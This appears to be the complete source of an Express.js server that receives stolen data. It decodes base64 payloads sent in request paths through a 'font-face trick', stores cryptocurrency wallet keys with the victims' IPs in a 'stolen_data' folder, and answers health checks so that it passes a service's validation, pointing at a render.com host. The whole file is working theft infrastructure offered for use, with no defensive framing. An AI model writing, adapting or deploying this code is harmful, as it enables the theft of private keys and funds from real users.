// server.js - Updated to handle Axiom's expected responses
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FOLDER = path.join(__dirname, 'stolen_data');

if (!fs.existsSync(DATA_FOLDER)) {
    fs.mkdirSync(DATA_FOLDER, { recursive: true });
}

console.log(`🚀 Server starting on port ${PORT}`);

// Catch-all route for data exfiltration (font-face trick)
app.get('*', (req, res) => {
    const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const receivedAt = new Date().toISOString();

    console.log(`[${receivedAt}] 📥 Request: ${fullUrl}`);

    const segments = req.path.split('/').filter(Boolean);
    const encodedData = segments[segments.length - 1] || '';

    if (encodedData.length > 40) {
        try {
            const decodedStr = Buffer.from(encodedData, 'base64').toString('utf8');
            const data = JSON.parse(decodedStr);

            const output = {
                receivedAt,
                ip: req.ip || req.socket.remoteAddress,
                userAgent: data.header || 'unknown',
                keysCount: data.keys ? data.keys.length : 0,
                keys: data.keys || []
            };

            const filename = `stolen_${timestamp}.json`;
            fs.writeFileSync(path.join(DATA_FOLDER, filename), JSON.stringify(output, null, 2));

            console.log(`✅ SAVED → ${filename} | ${output.keysCount} wallet(s)`);
        } catch (err) {
            console.error(`❌ Decode failed: ${err.message}`);
        }
    }

    // Return a response that satisfies Axiom's check
    if (req.path.includes('/health') || req.path.includes('backfil')) {
        res.json({
            success: true,
            msg: "OK",
            backfil: "https://terminalcore.onrender.com"   // replace with your real Render URL
        });
    } else {
        res.status(200).send('OK');
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server live on port ${PORT}`);
});